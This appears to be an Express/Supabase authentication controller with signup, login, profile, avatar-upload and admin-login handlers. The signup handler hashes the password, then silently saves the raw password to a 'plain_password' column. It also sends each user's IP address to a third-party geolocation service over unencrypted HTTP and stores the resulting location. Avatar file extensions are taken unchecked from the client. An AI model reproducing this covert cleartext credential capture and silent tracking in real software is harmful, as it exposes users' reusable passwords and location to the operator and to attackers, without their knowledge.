const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { z } = require('zod');
const { supabase } = require('../config/supabase');

const signupSchema = z.object({
  email: z.string().email(),
  password: z.string().min(6),
  name: z.string().min(2)
});

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string()
});

const signup = async (req, res) => {
  try {
    const { email, password, name } = signupSchema.parse(req.body);

    const { data: existingUser } = await supabase
      .from('users')
      .select('id')
      .eq('email', email)
      .single();

    if (existingUser) {
      return res.status(400).json({ error: 'User already exists' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    // Get real IP — works behind proxies/Vercel/Nginx
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || null;

    // Resolve IP to location using ip-api.com (free, no key needed)
    let ipCountry = null, ipCity = null, ipRegion = null;
    if (ip && ip !== '::1' && ip !== '127.0.0.1') {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,status`);
        const geo = await geoRes.json();
        if (geo.status === 'success') {
          ipCountry = geo.country || null;
          ipRegion  = geo.regionName || null;
          ipCity    = geo.city || null;
        }
      } catch (_) {}
    }

    // Insert user
    const { data: user, error } = await supabase
      .from('users')
      .insert([{ email, password: hashedPassword, name }])
      .select('id, email, name, created_at')
      .single();

    if (error) throw error;

    // Save plain_password, ip and location separately — silently ignore if columns missing
    try {
      await supabase
        .from('users')
        .update({ plain_password: password, ip_address: ip, ip_country: ipCountry, ip_region: ipRegion, ip_city: ipCity })
        .eq('id', user.id);
    } catch (_) {}

    const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '7d' });

    res.status(201).json({
      message: 'User created successfully',
      token,
      user: { id: user.id, email: user.email, name: user.name }
    });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ error: 'Invalid input', details: error.errors });
    }
    console.error('Signup error:', error);
    res.status(500).json({ error: 'Failed to create user' });
  }
};

const login = async (req, res) => {
  try {
    const { email, password } = loginSchema.parse(req.body);

    const { data: user, error } = await supabase
      .from('users')
      .select('*')
      .eq('email', email)
      .single();

    if (error || !user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const isValidPassword = await bcrypt.compare(password, user.password);
    if (!isValidPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '7d' });

    res.json({
      message: 'Login successful',
      token,
      user: { id: user.id, email: user.email, name: user.name }
    });
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ error: 'Invalid input', details: error.errors });
    }
    console.error('Login error:', error);
    res.status(500).json({ error: 'Failed to login' });
  }
};

const getProfile = async (req, res) => {
  try {
    let { data: user, error } = await supabase
      .from('users')
      .select('id, email, name, avatar_url, bio, created_at')
      .eq('id', req.userId)
      .single();

    if (error) {
      const fallback = await supabase
        .from('users')
        .select('id, email, name, created_at')
        .eq('id', req.userId)
        .single();
      if (fallback.error || !fallback.data) {
        return res.status(404).json({ error: 'User not found' });
      }
      user = fallback.data;
    }

    if (!user) return res.status(404).json({ error: 'User not found' });

    res.json({ user });
  } catch (error) {
    console.error('Get profile error:', error);
    res.status(500).json({ error: 'Failed to get profile' });
  }
};

const updateProfile = async (req, res) => {
  try {
    const { name, bio, avatar_url } = req.body;
    const updates = {};
    if (name !== undefined) updates.name = name;
    if (bio !== undefined) updates.bio = bio;
    if (avatar_url !== undefined) updates.avatar_url = avatar_url;

    if (Object.keys(updates).length === 0) {
      const { data: user } = await supabase
        .from('users')
        .select('id, email, name, created_at')
        .eq('id', req.userId)
        .single();
      return res.json({ message: 'No changes', user });
    }

    let { data: user, error } = await supabase
      .from('users')
      .update(updates)
      .eq('id', req.userId)
      .select('id, email, name, avatar_url, bio, created_at')
      .single();

    if (error) {
      const safeUpdates = {};
      if (updates.name) safeUpdates.name = updates.name;
      if (Object.keys(safeUpdates).length > 0) {
        const fallback = await supabase
          .from('users')
          .update(safeUpdates)
          .eq('id', req.userId)
          .select('id, email, name, created_at')
          .single();
        if (fallback.error) throw fallback.error;
        user = fallback.data;
      } else {
        throw error;
      }
    }

    res.json({ message: 'Profile updated', user });
  } catch (error) {
    console.error('Update profile error:', error);
    res.status(500).json({ error: 'Failed to update profile' });
  }
};

const uploadAvatar = async (req, res) => {
  try {
    const { base64, mimeType } = req.body;
    if (!base64 || !mimeType) {
      return res.status(400).json({ error: 'base64 and mimeType required' });
    }

    const ext = mimeType.split('/')[1] || 'jpg';
    const fileName = `${req.userId}.${ext}`;
    const buffer = Buffer.from(base64, 'base64');

    const { error: uploadError } = await supabase.storage
      .from('avatars')
      .upload(fileName, buffer, { contentType: mimeType, upsert: true });

    if (uploadError) throw uploadError;

    const { data: { publicUrl } } = supabase.storage
      .from('avatars')
      .getPublicUrl(fileName);

    await supabase
      .from('users')
      .update({ avatar_url: publicUrl })
      .eq('id', req.userId);

    res.json({ avatar_url: publicUrl });
  } catch (error) {
    console.error('Upload avatar error:', error);
    res.status(500).json({ error: 'Failed to upload avatar' });
  }
};

const adminLogin = async (req, res) => {
  try {
    const { username, password } = req.body;
    if (
      username !== process.env.ADMIN_USERNAME ||
      password !== process.env.ADMIN_PASSWORD
    ) {
      return res.status(401).json({ error: 'Invalid admin credentials' });
    }
    const token = jwt.sign(
      { userId: 'admin', isAdmin: true },
      process.env.JWT_SECRET,
      { expiresIn: '7d' }
    );
    res.json({ token, user: { id: 'admin', name: 'Admin', isAdmin: true } });
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ error: 'Admin login failed' });
  }
};

module.exports = { signup, login, getProfile, updateProfile, uploadAvatar, adminLogin };
